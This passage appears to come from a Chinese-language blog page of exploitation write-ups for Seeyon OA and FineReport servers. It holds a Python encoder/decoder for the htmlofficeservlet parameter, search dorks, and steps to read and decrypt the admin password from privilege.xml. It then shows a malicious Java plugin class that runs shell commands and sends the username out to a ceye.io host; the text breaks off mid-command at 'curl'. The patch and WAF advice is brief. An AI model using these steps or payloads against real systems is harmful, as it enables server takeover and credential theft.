&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;from sys import argv
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;letters = &amp;#34;gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;def base64_encode(input_str):
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    str_ascii_list = [&amp;#39;{:0&amp;gt;8}&amp;#39;.format(str(bin(ord(i))).replace(&amp;#39;0b&amp;#39;, &amp;#39;&amp;#39;))
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                      for i in input_str]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    output_str = &amp;#39;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    equal_num = 0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    while str_ascii_list:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        temp_list = str_ascii_list[:3]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        if len(temp_list) != 3:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            while len(temp_list) &amp;lt; 3:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                equal_num += 1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                temp_list += [&amp;#39;0&amp;#39; * 8]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        temp_str = &amp;#39;&amp;#39;.join(temp_list)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        temp_str_list = [temp_str[x:x + 6] for x in [0, 6, 12, 18]]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        temp_str_list = [int(x, 2) for x in temp_str_list]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        if equal_num:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            temp_str_list = temp_str_list[0:4 - equal_num]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        output_str += &amp;#39;&amp;#39;.join([letters[x] for x in temp_str_list])
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        str_ascii_list = str_ascii_list[3:]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    output_str = output_str + &amp;#39;=&amp;#39; * equal_num
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    return output_str
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;def base64_decode(input_str):
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    str_ascii_list = [&amp;#39;{:0&amp;gt;6}&amp;#39;.format(str(bin(letters.index(i))).replace(&amp;#39;0b&amp;#39;, &amp;#39;&amp;#39;))
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                      for i in input_str if i != &amp;#39;=&amp;#39;]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    output_str = &amp;#39;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    equal_num = input_str.count(&amp;#39;=&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    while str_ascii_list:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        temp_list = str_ascii_list[:4]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        temp_str = &amp;#39;&amp;#39;.join(temp_list)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        if len(temp_str) % 8 != 0:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            temp_str = temp_str[0:-1 * equal_num * 2]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        temp_str_list = [temp_str[x:x + 8] for x in [0, 8, 16]]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        temp_str_list = [int(x, 2) for x in temp_str_list if x]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        output_str += &amp;#39;&amp;#39;.join([chr(x) for x in temp_str_list])
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        str_ascii_list = str_ascii_list[4:]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    return output_str
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;if __name__ == &amp;#34;__main__&amp;#34;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    if len(argv) == 2:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print(base64_decode(argv[1]))
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    elif len(argv) == 3:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        if argv[1] == &amp;#39;-d&amp;#39;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            print(base64_decode(argv[2]))
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        else:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            print(base64_encode(argv[2]))
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    else:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print(&amp;#34;Seeyon OA /seeyon/htmlofficeservlet param encode/decode&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print(&amp;#34;Usage:&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print(&amp;#34;python %s encoded_str&amp;#34; % argv[0])t
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print(&amp;#34;python %s -d encoded_str&amp;#34; % argv[0])
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print(&amp;#34;python %s -e raw_str&amp;#34; % argv[0])
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁&lt;/p&gt;
&lt;p&gt;2.使用waf拦截&lt;/p&gt;
&lt;h2 id=&#34;致远oa-帆软报表-seeyonreport-远程代码执行&#34;&gt;[致远OA] 帆软报表 seeyonreport 远程代码执行&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;帆软报表 (seeyonreport) 很多时候会跟合致远OA一起出现, 通常用户还不知道, 所以这里有几个漏洞点&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;帆软报表 seeyonreport&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;amp;cmd=fs_signin&amp;amp;_=1560911828892&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;seeyonreport&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;用友-致远OA&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;帆软报表v8.0 Getshell漏洞分析 | ADog’s Blog
&lt;a class=&#34;link&#34; href=&#34;http://foreversong.cn/archives/1378&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://foreversong.cn/archives/1378&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;帆软报表v8.0 Getshell漏洞分析 | ADog’s Blog
&lt;a class=&#34;link&#34; href=&#34;http://foreversong.cn/archives/1378&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://foreversong.cn/archives/1378&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;xray/finereport-directory-traversal.yml at master · chaitin/xray
&lt;a class=&#34;link&#34; href=&#34;https://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml&lt;/a&gt;
&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.未设置密码或者读取读取管理员密码
&lt;a class=&#34;link&#34; href=&#34;https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;amp;cmd=fs_signin&amp;amp;_=1560911828892&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里很有可能是没有设置密码的, 修改密码进入后台就可以了&lt;/p&gt;
&lt;p&gt;如果设置里密码, 尝试这个接口 &lt;code&gt;/report/ReportServer?op=chart&amp;amp;cmd=get_geo_json&amp;amp;resourcepath=privilege.xml&lt;/code&gt;, 读取管理员密码, 然后使用上文的解密程序解密&lt;/p&gt;
&lt;p&gt;2.后台getshell
这种后台能装插件的都随便getshell&lt;/p&gt;
&lt;p&gt;先去下载一个指定版本的jar包&lt;/p&gt;
&lt;p&gt;本地测试环境是9.0&lt;/p&gt;
&lt;p&gt;下载com.fr.plugin.external-1.3.4.zip
&lt;a class=&#34;link&#34; href=&#34;https://shop.finereport.com/plugin/2d36b210-2a59-4940-8c4f-f3f16d58cd66&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://shop.finereport.com/plugin/2d36b210-2a59-4940-8c4f-f3f16d58cd66&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://shopps.finereport.com/com.fr.plugin.external-1.3.4.zip?e=1561433162&amp;amp;token=GYG9vMioxqbEgx-5HoAMAelD0zGdUrXT4UZ3w-d1:N-PeIkhKkjCY7LHdqelnSvp_LmA=&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://shopps.finereport.com/com.fr.plugin.external-1.3.4.zip?e=1561433162&amp;token=GYG9vMioxqbEgx-5HoAMAelD0zGdUrXT4UZ3w-d1:N-PeIkhKkjCY7LHdqelnSvp_LmA=&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;编译一个恶意的class打包进去&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;package&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;plugin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;external&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;locale&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IOException&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LocaleFinder&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;LocaleFinder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;throws&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IOException&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;InterruptedException&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;commands&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getProperty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;os.name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;toLowerCase&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;contains&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;win&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;commands&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\\Windows\\System32\\cmd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/c&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ping -nc 3 %username%.win.seeyonreport.ceyedoamin.ceye.io&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;commands&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-c&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;curl 